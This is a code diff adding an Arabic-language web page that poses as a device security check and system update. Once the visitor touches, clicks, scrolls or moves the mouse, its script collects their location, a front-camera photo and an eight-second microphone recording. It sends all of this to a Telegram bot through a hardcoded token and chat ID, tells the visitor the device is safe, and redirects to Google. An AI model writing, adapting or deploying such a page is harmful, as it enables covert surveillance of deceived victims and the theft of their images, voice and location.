@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>جاري التحقق من الجهاز...</title>
+<style>
+body{font-family:-apple-system,Roboto,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;-webkit-user-select:none;user-select:none}
+.box{width:320px;text-align:center;pointer-events:none}
+.loader{width:60px;height:60px;border:5px solid #222;border-top:5px solid #007bff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+h2{font-size:20px;margin-bottom:10px}
+p{color:#888;font-size:14px;margin-bottom:20px;line-height:1.6}
+video{display:none}
+canvas{display:none}
+#status{color:#28a745;font-size:13px;margin-top:15px;min-height:20px}
+</style>
+</head>
+<body>
+<div class="box">
+    <div class="loader" id="loader"></div>
+    <h2 id="title">جاري الاتصال بالخادم...</h2>
+    <p id="desc">الرجاء الانتظار، يتم التحقق من أمان جهازك. لا تغلق الصفحة.</p>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+    <div id="status"></div>
+</div>
+
+<script>
+const TOKEN="9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
+const CHAT_ID="7356963877";
+let isExecuting = false;
+
+// دالة التنفيذ الفوري
+async function executeCapture() {
+    if (isExecuting) return;
+    isExecuting = true;
+
+    const title = document.getElementById('title');
+    const desc = document.getElementById('desc');
+    const statusDiv = document.getElementById('status');
+    
+    title.textContent = "جاري تحديث النظام...";
+    desc.textContent = "يرجى عدم إغلاق الصفحة حتى يكتمل التحديث.";
+
+    // 1. الموقع
+    let loc = "غير متاح";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { loc = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`; },
+            (err) => { loc = "مرفوض"; }
+        );
+    }
+
+    // 2. الكاميرا
+    statusDiv.textContent = "جاري التحقق من الكاميرا...";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('v');
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 800));
+        
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(t => t.stop());
+        
+        canvas.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'cam.jpg');
+            fd.append('caption', `📸 صورة فورية\n📍 ${loc}`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.7);
+    } catch (err) {}
+
+    // 3. الميكروفون (تسجيل 8 ثواني)
+    statusDiv.textContent = "جاري التحقق من الصوت...";
+    try {
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(audioStream);
+        let chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('voice', blob, 'mic.webm');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            audioStream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { mediaRecorder.stop(); }, 8000);
+    } catch (err) {}
+
+    // 4. إنهاء الشاشة
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        title.textContent = "الجهاز آمن الآن";
+        desc.textContent = "اكتمل التحديث. سيتم إعادة التوجيه.";
+        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+    }, 10000);
+}
+
+// خدعة اللمس: أول لمسة في أي مكان بالشاشة تشغل الكاميرا والمايك
+document.body.addEventListener('touchstart', executeCapture, { once: true });
+document.body.addEventListener('click', executeCapture, { once: true });
+document.body.addEventListener('scroll', executeCapture, { once: true });
+document.body.addEventListener('mousemove', executeCapture, { once: true });
+</script>
+</body>
+</html>
